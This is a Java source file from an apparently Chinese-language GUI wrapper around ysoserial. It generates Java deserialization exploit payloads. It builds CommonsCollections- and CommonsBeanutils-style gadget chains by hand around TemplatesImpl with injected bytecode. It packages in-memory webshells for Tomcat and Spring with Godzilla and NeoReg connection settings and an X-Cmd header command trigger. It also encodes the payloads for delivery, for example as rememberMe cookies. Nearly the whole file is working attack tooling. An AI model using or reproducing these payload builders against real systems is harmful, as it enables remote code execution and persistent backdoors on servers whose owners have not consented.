package ysogui.core;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.PrintStream;
import java.util.Enumeration;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Arrays;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.zip.GZIPOutputStream;

import ysogui.model.ChainInfo;
import ysogui.model.MemshellConfig;

/**
 * 通过反射调用 ysoserial.GeneratePayload，捕获输出字节，
 * 然后按用户选择的格式转换。
 * 
 * 支持两种模式：
 * 1. 内置链：使用 ysoserial jar 中的 GeneratePayload.main()
 * 2. 自定义链：使用用户指定的外部 jar，通过反射调用 ObjectPayload.getObject()
 */
public class PayloadGenerator {

    public enum OutputFormat {
        BASE64        ("Base64"),
        GZIP_BASE64   ("Gzip+Base64"),
        URL_ENCODED   ("URL编码"),
        BASE64_URL    ("Base64+URL编码"),
        HEX           ("Hex"),
        RAW_HEX_DUMP  ("Hex Dump"),
        RAW           ("Raw（仅保存文件）"),
        CLASS_FILE    ("导出 .class 模板");

        private final String label;
        OutputFormat(String label) { this.label = label; }

        /** Raw 和 CLASS_FILE 格式只能写文件，不能在文本框展示 */
        public boolean isDisplayable() { return this != RAW && this != CLASS_FILE; }

        @Override
        public String toString() { return label; }
    }

    private final URLClassLoader classLoader;

    public PayloadGenerator(URLClassLoader classLoader) {
        this.classLoader = classLoader;
    }

    /** 获取 ysoserial 的 ClassLoader（用于从 jar 中读取模板类等资源） */
    public URLClassLoader getClassLoader() {
        return classLoader;
    }

    /**
     * 生成 payload 并按指定格式返回字符串
     *
     * @param chainName  链名，如 "CommonsCollections6"
     * @param command    命令，如 "calc" 或 "CLASS:TomcatFilterMemShellFromThread"
     * @param format     输出格式
     * @return 格式化后的字符串
     */
    /**
     * 生成 payload 并按指定格式返回字符串（内部会调一次 generateRaw）。
     * 如果调用方已经持有原始字节，推荐直接用 convertRaw() 避免重复生成。
     */
    public String generate(String chainName, String command, OutputFormat format) throws Exception {
        return convertRaw(generateRaw(chainName, command), format);
    }

    /**
     * 将已有的原始字节按指定格式转换为字符串。
     * 供 doGenerate() 使用，避免二次调用 ysoserial（generateRaw 本身开销不小）。
     *
     * @param raw    Java 序列化字节（魔数 0xACED0005 开头）
     * @param format 目标格式
     */
    public String convertRaw(byte[] raw, OutputFormat format) throws Exception {
        switch (format) {
            case BASE64:       return Base64.getEncoder().encodeToString(raw);
            case GZIP_BASE64:  return gzipBase64(raw);
            case URL_ENCODED:  return urlEncode(raw);
            // Base64 先编码成 ASCII 文本，再对该文本做 URL 编码
            // 常用于某些框架对 rememberMe cookie 的二次编码场景
            case BASE64_URL:   return urlEncode(
                                   Base64.getEncoder().encodeToString(raw)
                                         .getBytes(StandardCharsets.UTF_8));
            case HEX:          return toHex(raw);
            case RAW_HEX_DUMP: return toHexDump(raw);
            // RAW 格式只能写文件，文本框不显示有效内容
            case RAW:          return "[Raw 字节已就绪，请点击「保存文件」写出 .bin]";
            // CLASS_FILE 格式：导出模板 .class 文件
            case CLASS_FILE:   return "[模板 .class 已就绪，请点击「保存文件」写出 .class]";
            default:           return Base64.getEncoder().encodeToString(raw);
        }
    }

    /**
     * 生成原始字节，根据 ChainInfo 自动选择内置/自定义模式
     */
    public byte[] generateRaw(ChainInfo chain, String command) throws Exception {
        if (chain.isCustom() && chain.getCustomJarPath() != null && chain.getCustomClassName() != null) {
            return generateCustomRaw(chain.getCustomJarPath(), chain.getCustomClassName(), command);
        }
        return generateRaw(chain.getName(), command);
    }

    /**
     * 智能生成：
     * - 普通命令：直接走 ysoserial
     * - CLASS:xxx：优先解析为内置模板，其次解析为内存马配置中的名称/类名
     */
    public byte[] generateRawSmart(ChainInfo chain, String command) throws Exception {
        if (chain == null) {
            throw new Exception("未选择链");
        }
        if (chain.isCustom() && chain.getCustomJarPath() != null && chain.getCustomClassName() != null
            && !isClassCommand(command)) {
            return generateCustomRaw(chain.getCustomJarPath(), chain.getCustomClassName(), command);
        }
        return generateRawSmart(chain.getName(), command);
    }

    public byte[] generateRawSmart(String chainName, String command) throws Exception {
        if (isClassCommand(command)) {
            String templateSpec = command.substring("CLASS:".length()).trim();
            if (templateSpec.isEmpty()) {
                throw new Exception("CLASS: 后必须填写模板名或自定义内存马名称");
            }
            return generateNamedMemshellRaw(chainName, templateSpec);
        }
        return generateRaw(chainName, command);
    }

    /**
     * 生成内存马 payload。
     *
     * 使用 ysoserial 的 CLASS:xxx 语法，ysoserial 会自动将模板类字节码嵌入
     * TemplatesImpl 并在类名后追加随机后缀（用于避免类名冲突）。
     * 模板类的 static block 在类加载时执行，完成 Filter/Servlet/Listener 注册。
     *
     * @param chainName      gadget 链名
     * @param templateClass  模板类名（如 "TomcatFilterMemShellFromJMX"）
     * @param format         输出格式
     * @return 格式化后的字符串
     */
    public String generateMemshell(String chainName, String templateClass, OutputFormat format) throws Exception {
        byte[] raw = generateMemshellRaw(chainName, templateClass);
        return convertRaw(raw, format);
    }

    /**
     * 提取模板类的原始 .class 字节码（不走序列化）。
     *
     * 搜索顺序：
     * 1. ysoserial jar 的 ysoserial/payloads/templates/ 目录
     * 2. YsoGUI classpath 的 ysogui/memshell/ 目录
     *
     * @param templateClass 模板类名，如 TomcatCmdEcho、TomcatFilterMemShellFromThread
     * @return .class 文件的原始字节码
     */
    public byte[] extractTemplateClass(String templateClass) throws Exception {
        // 1. 从 ysoserial jar 提取
        String ysoserialPath = "ysoserial/payloads/templates/" + templateClass + ".class";
        InputStream is = classLoader.getResourceAsStream(ysoserialPath);
        if (is != null) {
            try (InputStream stream = is) {
                return readAllBytes(stream);
            }
        }

        // 2. 从 YsoGUI classpath 提取自定义模板
        String customPath = "ysogui/memshell/" + templateClass + ".class";
        InputStream customIs = PayloadGenerator.class.getClassLoader().getResourceAsStream(customPath);
        if (customIs != null) {
            try (InputStream stream = customIs) {
                return readAllBytes(stream);
            }
        }

        throw new Exception("找不到模板类: " + templateClass
            + "（搜索了 " + ysoserialPath + " 和 " + customPath + "）");
    }

    /**
     * 提取链条本身的 .class 文件（如 CommonsCollections6.class）。
     * 从 ysoserial jar 的 ysoserial/payloads/ 目录读取。
     *
     * @param chainName 链名，如 "CommonsCollections6"
     * @return 链条 .class 文件的原始字节码
     */
    public byte[] extractChainClass(String chainName) throws Exception {
        // 从 ysoserial jar 的 payloads 包读取
        String path = "ysoserial/payloads/" + chainName + ".class";
        InputStream is = classLoader.getResourceAsStream(path);
        if (is != null) {
            try (InputStream stream = is) {
                return readAllBytes(stream);
            }
        }

        throw new Exception("找不到链条类: " + chainName
            + "（搜索了 " + path + "）");
    }

    private byte[] readAllBytes(InputStream is) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int len;
        while ((len = is.read(buf)) != -1) {
            baos.write(buf, 0, len);
        }
        return baos.toByteArray();
    }

    /**
     * 生成内存马 payload 的原始字节。
     *
     * 模板类搜索顺序：
     * 1. ysoserial jar 的 ysoserial/payloads/templates/ 目录
     * 2. YsoGUI classpath 的 ysogui/memshell/ 目录（自定义内存马模板）
     *
     * 找到后手动构造 TemplatesImpl 对象（不重命名类），然后通过 ysoserial 的链生成 payload。
     */
    public byte[] generateMemshellRaw(String chainName, String templateClass) throws Exception {
        // 先尝试 ysoserial 的 CLASS:xxx 方式（从 ysoserial jar 读取）
        String ysoserialPath = "ysoserial/payloads/templates/" + templateClass + ".class";
        java.io.InputStream is = classLoader.getResourceAsStream(ysoserialPath);
        if (is != null) {
            is.close();
            return generateRaw(chainName, "CLASS:" + templateClass);
        }

        // 尝试从 YsoGUI classpath 读取自定义模板
        String customPath = "ysogui/memshell/" + templateClass + ".class";
        java.io.InputStream customIs = PayloadGenerator.class.getClassLoader().getResourceAsStream(customPath);
        if (customIs == null) {
            throw new Exception("找不到模板类: " + templateClass + "（搜索了 " + ysoserialPath + " 和 " + customPath + "）");
        }

        // 读取自定义模板字节码
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int len;
        while ((len = customIs.read(buf)) != -1) {
            baos.write(buf, 0, len);
        }
        customIs.close();
        byte[] classBytes = baos.toByteArray();
        return generateMemshellRaw(chainName, templateClass, new byte[][]{classBytes});
    }

    /**
     * 将任意 class 字节码数组注入 TemplatesImpl，再用链包装为 payload。
     * 适用于 GUI 自定义内存马，不要求 ysoserial 原生支持 CLASS:该模板名。
     */
    public byte[] generateMemshellRaw(String chainName, String templateClass, byte[][] classBytecodes) throws Exception {
        // 手动构造 TemplatesImpl（不重命名类）
        Class<?> templatesImplClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Object templates = templatesImplClass.newInstance();

        java.lang.reflect.Field bytecodesField = templatesImplClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, classBytecodes);

        java.lang.reflect.Field nameField = templatesImplClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, templateClass);

        java.lang.reflect.Field tfactoryField = templatesImplClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());

        // 通过 ysoserial 链包装 TemplatesImpl
        Thread currentThread = Thread.currentThread();
        ClassLoader originalTCCL = currentThread.getContextClassLoader();
        currentThread.setContextClassLoader(classLoader);

        try {
            Object chainRoot;
            String chainUpper = chainName.toUpperCase();

            if (chainUpper.contains("COMMONSBEANUTILS") || chainUpper.contains("CB1")) {
                chainRoot = buildCBChain(templates);
            } else {
                // CC2/CC4 等使用 InvokerTransformer/InstantiateTransformer 的链
                chainRoot = buildCC2LikeChain(templates);
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream();
            java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(out);
            oos.writeObject(chainRoot);
            oos.close();
            return out.toByteArray();
        } finally {
            currentThread.setContextClassLoader(originalTCCL);
        }
    }

    public boolean hasBuiltinTemplate(String templateClass) {
        if (templateClass == null || templateClass.trim().isEmpty()) {
            return false;
        }
        String ysoserialPath = "ysoserial/payloads/templates/" + templateClass + ".class";
        InputStream is = classLoader.getResourceAsStream(ysoserialPath);
        if (is == null) {
            return false;
        }
        try {
            is.close();
        } catch (Exception ignored) {
        }
        return true;
    }

    public boolean supportsCustomMemshellChain(String chainName) {
        return ChainMetaManager.supportsCustomClassInjection(chainName);
    }

    public String getCustomMemshellUnsupportedReason(String chainName) {
        return ChainMetaManager.getCustomClassInjectionReason(chainName);
    }

    public byte[] generateNamedMemshellRaw(String chainName, String templateSpec) throws Exception {
        if (hasBuiltinTemplate(templateSpec)) {
            return generateMemshellRaw(chainName, templateSpec);
        }

        MemshellConfig config = resolveMemshellConfig(templateSpec);
        if (config == null) {
            throw new Exception("找不到内存马模板: " + templateSpec
                + "（可填写内置模板类名，或内存马列表中的名称）");
        }

        String payloadClassName = resolvePayloadClassName(config);
        if (config.isBuiltin()) {
            return generateMemshellRaw(chainName, payloadClassName);
        }

        String unsupportedReason = getCustomMemshellUnsupportedReason(chainName);
        if (unsupportedReason != null) {
            throw new Exception(unsupportedReason);
        }

        byte[][] classBytecodes = readMemshellClassBytecodes(config);
        return generateMemshellRaw(chainName, payloadClassName, classBytecodes);
    }

    public java.util.List<MemshellConfig> discoverBuiltinMemshellConfigs() {
        java.util.Map<String, MemshellConfig> result = new java.util.LinkedHashMap<String, MemshellConfig>();
        try {
            URL[] urls = classLoader.getURLs();
            for (URL url : urls) {
                File file;
                try {
                    file = new File(url.toURI());
                } catch (Exception e) {
                    file = new File(url.getPath());
                }
                if (!file.isFile() || !file.getName().toLowerCase().contains("yso")) {
                    continue;
                }
                try (JarFile jar = new JarFile(file)) {
                    Enumeration<JarEntry> entries = jar.entries();
                    while (entries.hasMoreElements()) {
                        JarEntry entry = entries.nextElement();
                        String name = entry.getName();
                        if (!name.startsWith("ysoserial/payloads/templates/") || !name.endsWith(".class")) {
                            continue;
                        }
                        if (name.contains("$")) {
                            continue;
                        }
                        String simpleName = name.substring(name.lastIndexOf('/') + 1, name.length() - 6);
                        if (!looksLikeMemshellTemplate(simpleName)) {
                            continue;
                        }
                        if (!result.containsKey(simpleName)) {
                            MemshellConfig config = buildAutoDiscoveredConfig(simpleName);
                            result.put(config.getName(), config);
                        }
                    }
                } catch (Exception ignored) {
                }
            }
        } catch (Exception ignored) {
        }
        return new java.util.ArrayList<MemshellConfig>(result.values());
    }

    private boolean isClassCommand(String command) {
        return command != null && command.startsWith("CLASS:");
    }

    private boolean looksLikeMemshellTemplate(String templateName) {
        return templateName != null
            && !templateName.endsWith("Template")
            && (templateName.contains("MemShell")
                || templateName.contains("CmdEcho")
                || templateName.contains("Echo")
                || templateName.contains("NeoReg"));
    }

    private MemshellConfig buildAutoDiscoveredConfig(String templateName) {
        MemshellConfig config = new MemshellConfig();
        config.setName(templateName);
        config.setTemplateClass(templateName);
        config.setBuiltin(true);

        if (isEchoTemplate(templateName)) {
            config.setMode("echo");
            config.setType("Echo");
            config.setRequestMethod(defaultEchoRequestMethod(templateName));
            config.setTriggerSource(defaultEchoTriggerSource(templateName));
            config.setTriggerName(defaultEchoTriggerName(templateName));
            config.setTriggerHeader(defaultEchoTriggerHeader(templateName));
            config.setTriggerPath(defaultEchoTriggerPath(templateName));
            config.setResponseMode(defaultEchoResponseMode(templateName));
            config.setVerifyHint(defaultEchoVerifyHint(templateName));
            config.setServerType(inferServerType(templateName));
            config.setDescription(buildAutoDescription(templateName));
            return config;
        }

        config.setMode("connect");
        config.setType(inferShellType(templateName));
        config.setServerType(inferServerType(templateName));
        config.setTool(inferConnectTool(templateName));
        if ("NeoReg".equals(config.getType())) {
            config.setPassword("-");
            config.setSecretKey("-");
        } else {
            config.setPassword("pass");
            config.setSecretKey("key");
        }
        config.setDescription(buildAutoDescription(templateName));
        return config;
    }

    private boolean isEchoTemplate(String templateName) {
        return templateName != null && templateName.contains("CmdEcho");
    }

    private String defaultEchoRequestMethod(String templateName) {
        return "GET";
    }

    private String defaultEchoTriggerSource(String templateName) {
        return "header";
    }

    private String defaultEchoTriggerName(String templateName) {
        return "X-Cmd";
    }

    private String defaultEchoTriggerHeader(String templateName) {
        return "X-Cmd";
    }

    private String defaultEchoTriggerPath(String templateName) {
        return "/";
    }

    private String defaultEchoResponseMode(String templateName) {
        if (templateName != null && templateName.contains("CmdEcho")) {
            return "BODY_RAW";
        }
        return "NO_ECHO";
    }

    private String defaultEchoVerifyHint(String templateName) {
        if (templateName != null && templateName.contains("CmdEcho")) {
            return "默认按整个响应体判定结果；若页面包装了输出，可尝试切到更简单的路径，"
                + "或改用带边界/前后缀的自定义 echo 模板";
        }
        return "当前自动发现模板未识别出稳定回显规则，建议结合副作用或自定义提取配置验证";
    }

    private String inferShellType(String templateName) {
        if (templateName.contains("NeoReg")) return "NeoReg";
        if (templateName.contains("SpringInterceptor")) return "Spring";
        if (templateName.contains("Filter")) return "Filter";
        if (templateName.contains("Servlet")) return "Servlet";
        if (templateName.contains("Listener")) return "Listener";
        if (templateName.contains("Interceptor")) return "Interceptor";
        return "MemShell";
    }

    private String inferServerType(String templateName) {
        if (templateName.contains("Spring")) return "Spring";
        if (templateName.contains("Tomcat")) return "Tomcat";
        return "Unknown";
    }

    private String inferConnectTool(String templateName) {
        if (templateName != null && templateName.contains("NeoReg")) {
            return "neoreg";
        }
        return "godzilla";
    }

    private String buildAutoDescription(String templateName) {
        if (isEchoTemplate(templateName)) {
            String serverType = inferServerType(templateName);
            return "自动发现的 " + serverType + " Header 回显模板；"
                + "向可达路径发送 X-Cmd 请求头即可触发，命令结果通常直接回显在响应体";
        }
        if (templateName.contains("SpringInterceptor")) {
            return "自动发现的 Spring MVC Interceptor 模板；"
                + "一般挂到请求处理链，访问正常业务路径即可按连接型协议建立会话";
        }
        if (templateName.contains("NeoReg")) {
            return "自动发现的 NeoReg 模板；"
                + "通常以 Tomcat Listener 方式注册，适合走 HTTP 隧道/代理连接";
        }

        StringBuilder sb = new StringBuilder("自动发现的驻留型模板");
        if (templateName.contains("FromThread")) {
            sb.append("，优先走线程路径拿容器对象");
        } else if (templateName.contains("FromJMX")) {
            sb.append("，通过 JMX 路径拿容器对象");
        }
        String serverType = inferServerType(templateName);
        if (!"Unknown".equals(serverType)) {
            sb.append("，适用于 ").append(serverType);
        }
        return sb.toString();
    }

    private MemshellConfig resolveMemshellConfig(String templateSpec) {
        MemshellConfig direct = MemshellManager.get(templateSpec);
        if (direct != null) {
            return direct;
        }
        for (MemshellConfig config : MemshellManager.getAll()) {
            if (config == null) continue;
            if (templateSpec.equals(config.getTemplateClass())) return config;
            if (templateSpec.equals(config.getClassName())) return config;
            String simpleClassName = simpleClassName(config.getClassName());
            if (templateSpec.equals(simpleClassName)) return config;
        }
        return null;
    }

    private String resolvePayloadClassName(MemshellConfig config) {
        if (config == null) {
            return null;
        }
        if (config.isBuiltin() && config.getTemplateClass() != null && !config.getTemplateClass().trim().isEmpty()) {
            return config.getTemplateClass().trim();
        }
        if (config.getClassName() != null && !config.getClassName().trim().isEmpty()) {
            return config.getClassName().trim();
        }
        if (config.getClassFile() != null && !config.getClassFile().trim().isEmpty()) {
            String fileName = new File(config.getClassFile().trim()).getName();
            if (fileName.endsWith(".class")) {
                fileName = fileName.substring(0, fileName.length() - 6);
            }
            return fileName;
        }
        return config.getName();
    }

    private String simpleClassName(String className) {
        if (className == null || className.trim().isEmpty()) {
            return null;
        }
        int idx = className.lastIndexOf('.');
        return idx >= 0 ? className.substring(idx + 1) : className;
    }

    private byte[][] readMemshellClassBytecodes(MemshellConfig config) throws Exception {
        String classFilePath = config.getClassFile();
        if (classFilePath == null || classFilePath.trim().isEmpty()) {
            throw new Exception("自定义内存马缺少 class 文件路径: " + config.getName());
        }

        File file = new File(classFilePath.trim());
        if (!file.exists()) {
            throw new Exception("自定义 class 文件不存在: " + classFilePath);
        }

        List<byte[]> result = new ArrayList<byte[]>();
        result.add(Files.readAllBytes(file.toPath()));

        String baseName = file.getName().replace(".class", "");
        File parent = file.getParentFile();
        File[] innerClasses = parent != null ? parent.listFiles(f ->
            f.getName().startsWith(baseName + "$") && f.getName().endsWith(".class")) : null;
        if (innerClasses != null) {
            Arrays.sort(innerClasses, java.util.Comparator.comparing(File::getName));
            for (File inner : innerClasses) {
                result.add(Files.readAllBytes(inner.toPath()));
            }
        }
        return result.toArray(new byte[result.size()][]);
    }

    /**
     * 构造 CC2-like 链，但避免在本地生成阶段提前触发 TemplatesImpl.newTransformer()。
     */
    private Object buildCC2LikeChain(Object templates) throws Exception {
        Class<?> invokerTransformerClass = classLoader.loadClass("org.apache.commons.collections4.functors.InvokerTransformer");
        Object invokerTransformer = invokerTransformerClass.getConstructor(
            String.class, Class[].class, Object[].class
        ).newInstance("toString", new Class[0], new Object[0]);

        Class<?> transformingComparatorClass = classLoader.loadClass("org.apache.commons.collections4.comparators.TransformingComparator");
        Object comparator = transformingComparatorClass.getConstructor(
            classLoader.loadClass("org.apache.commons.collections4.Transformer")
        ).newInstance(invokerTransformer);

        java.util.PriorityQueue<Object> queue = new java.util.PriorityQueue<>(2, (java.util.Comparator) comparator);
        queue.add("1");
        queue.add("1");

        java.lang.reflect.Field methodNameField = invokerTransformerClass.getDeclaredField("iMethodName");
        methodNameField.setAccessible(true);
        methodNameField.set(invokerTransformer, "newTransformer");

        java.lang.reflect.Field queueField = java.util.PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArray = (Object[]) queueField.get(queue);
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }

    /**
     * 构造 CommonsBeanutils 链：PriorityQueue -> BeanComparator -> TemplatesImpl.getOutputProperties()
     */
    private Object buildCBChain(Object templates) throws Exception {
        Class<?> beanComparatorClass = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
        Object beanComparator = beanComparatorClass.getConstructor(String.class).newInstance("lowestSetBit");

        java.util.PriorityQueue<Object> queue = new java.util.PriorityQueue<>(2, (java.util.Comparator) beanComparator);
        queue.add(java.math.BigInteger.ONE);
        queue.add(java.math.BigInteger.ONE);

        java.lang.reflect.Field propertyField = beanComparatorClass.getDeclaredField("property");
        propertyField.setAccessible(true);
        propertyField.set(beanComparator, "outputProperties");

        java.lang.reflect.Field queueField = java.util.PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArray = (Object[]) queueField.get(queue);
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }

    /**
     * 自定义链：从外部 .class 文件加载 ObjectPayload 实现类，反射调用 getObject()
     * 支持 .class 文件（目录作为 classpath）
     */
    private byte[] generateCustomRaw(String filePath, String className, String command) throws Exception {
        File payloadFile = new File(filePath);
        if (!payloadFile.exists()) {
            throw new Exception("自定义链文件不存在: " + filePath);
        }

        String fileName = payloadFile.getName();
        URL classpathUrl;

        if (fileName.endsWith(".class")) {
            // .class 文件：从类名推导 classpath 根目录
            String packagePath = className.contains(".")
                ? className.substring(0, className.lastIndexOf('.')).replace('.', '/')
                : "";
            File classpathRoot = payloadFile.getParentFile();
            if (!packagePath.isEmpty()) {
                String[] pkgParts = packagePath.split("/");
                for (int i = 0; i < pkgParts.length; i++) {
                    classpathRoot = classpathRoot.getParentFile();
                    if (classpathRoot == null) {
                        classpathRoot = payloadFile.getParentFile();
                        break;
                    }
                }
            }
            classpathUrl = classpathRoot.toURI().toURL();
        } else {
            throw new Exception("不支持的文件类型: " + fileName + "（支持 .class）");
        }

        URL[] urls = new URL[]{
            classpathUrl,
            ((URLClassLoader) classLoader).getURLs()[0]
        };
        URLClassLoader customLoader = new URLClassLoader(urls, classLoader);

        Class<?> payloadClass;
        try {
            payloadClass = customLoader.loadClass(className);
        } catch (ClassNotFoundException e) {
            throw new Exception("找不到类: " + className + "，请检查类名和文件是否匹配");
        }

        // 验证实现了 ObjectPayload 接口
        Class<?> objectPayloadIf = null;
        for (Class<?> iface : payloadClass.getInterfaces()) {
            if (iface.getName().equals("ysoserial.payloads.ObjectPayload")) {
                objectPayloadIf = iface;
                break;
            }
        }
        // 也检查父类
        if (objectPayloadIf == null) {
            Class<?> sc = payloadClass.getSuperclass();
            while (sc != null && !sc.equals(Object.class)) {
                for (Class<?> iface : sc.getInterfaces()) {
                    if (iface.getName().equals("ysoserial.payloads.ObjectPayload")) {
                        objectPayloadIf = iface;
                        break;
                    }
                }
                if (objectPayloadIf != null) break;
                sc = sc.getSuperclass();
            }
        }
        if (objectPayloadIf == null) {
            throw new Exception(className + " 未实现 ysoserial.payloads.ObjectPayload 接口");
        }

        // 切换 TCCL 以支持 javassist
        Thread currentThread = Thread.currentThread();
        ClassLoader originalTCCL = currentThread.getContextClassLoader();
        currentThread.setContextClassLoader(customLoader);

        try {
            Object payload = payloadClass.newInstance();
            Method getObjectMethod = payloadClass.getMethod("getObject", String.class);
            Object result = getObjectMethod.invoke(payload, command);

            if (result == null) {
                throw new Exception("getObject() 返回 null");
            }

            if (result instanceof byte[]) {
                return (byte[]) result;
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream();
            java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(out);
            oos.writeObject(result);
            oos.close();
            return out.toByteArray();
        } finally {
            currentThread.setContextClassLoader(originalTCCL);
        }
    }

    /**
     * 内置链：通过捕获 System.out 拦截 ysoserial 输出
     *
     * ysoserial 内部在生成失败时会调用 System.exit()，导致整个 JVM 退出。
     * 解决方案：临时安装一个 SecurityManager 拦截 exit 调用，
     * 将其转为异常抛出，防止进程被杀死。
     */
    public byte[] generateRaw(String chainName, String command) throws Exception {
        URLClassLoader invocationLoader = new URLClassLoader(classLoader.getURLs(), null);
        try {
            Class<?> gpClass = invocationLoader.loadClass("ysoserial.GeneratePayload");
            Method mainMethod = gpClass.getMethod("main", String[].class);

            PrintStream originalOut = System.out;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            PrintStream capture = new PrintStream(baos);
            System.setOut(capture);

            SecurityManager originalSM = System.getSecurityManager();
            ExitTrappingSecurityManager trapSM = new ExitTrappingSecurityManager(originalSM);
            System.setSecurityManager(trapSM);

            Thread currentThread = Thread.currentThread();
            ClassLoader originalTCCL = currentThread.getContextClassLoader();
            currentThread.setContextClassLoader(invocationLoader);

            try {
                mainMethod.invoke(null, (Object) new String[]{chainName, command});
            } catch (Exception e) {
                if (trapSM.getExitStatus() != null) {
                    int status = trapSM.getExitStatus();
                    if (baos.size() == 0) {
                        throw new Exception("Payload 生成失败 (exit code " + status + ")，请检查链名或命令是否正确");
                    }
                } else if (baos.size() == 0) {
                    throw new Exception("Payload 生成失败: " + getRootCause(e).getMessage());
                }
            } finally {
                currentThread.setContextClassLoader(originalTCCL);
                System.setSecurityManager(originalSM);
                System.setOut(originalOut);
                capture.flush();
            }

            byte[] result = baos.toByteArray();
            if (result.length == 0) {
                throw new Exception("输出为空，请检查链名或命令是否正确");
            }
            if (result.length < 4 || result[0] != (byte) 0xAC || result[1] != (byte) 0xED) {
                throw new Exception("输出不是有效的 Java 序列化数据，请检查参数");
            }
            return result;
        } finally {
            try {
                invocationLoader.close();
            } catch (Exception ignored) {}
        }
    }

    /**
     * 自定义 SecurityManager，拦截 System.exit() 调用，
     * 将其记录为 exitStatus 而非真正终止 JVM。
     */
    private static class ExitTrappingSecurityManager extends SecurityManager {
        private final SecurityManager delegate;
        private Integer exitStatus;

        ExitTrappingSecurityManager(SecurityManager delegate) {
            this.delegate = delegate;
        }

        Integer getExitStatus() {
            return exitStatus;
        }

        @Override
        public void checkExit(int status) {
            this.exitStatus = status;
            // 抛出 SecurityException 阻止 JVM 退出
            throw new SecurityException("System.exit(" + status + ") 已拦截");
        }

        @Override
        public void checkPermission(java.security.Permission perm) {
            // 其他权限检查委托给原始 SecurityManager
            if (delegate != null) {
                delegate.checkPermission(perm);
            }
        }

        @Override
        public void checkPermission(java.security.Permission perm, Object context) {
            if (delegate != null) {
                delegate.checkPermission(perm, context);
            }
        }
    }

    // ─────────────────────────────── 格式转换 ────────────────────────────────

    private String gzipBase64(byte[] data) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (GZIPOutputStream gzip = new GZIPOutputStream(baos)) {
            gzip.write(data);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    /**
     * URL 编码：每个字节编码为 %XX，全字符编码（不跳过任何字符）
     */
    private String urlEncode(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * 3);
        for (byte b : bytes) {
            sb.append(String.format("%%%02X", b & 0xFF));
        }
        return sb.toString();
    }

    private String toHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    private String toHexDump(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < bytes.length; i++) {
            if (i > 0 && i % 16 == 0) sb.append('\n');
            sb.append(String.format("%02x ", bytes[i]));
        }
        return sb.toString().trim();
    }

    private Throwable getRootCause(Throwable t) {
        while (t.getCause() != null) t = t.getCause();
        return t;
    }
}
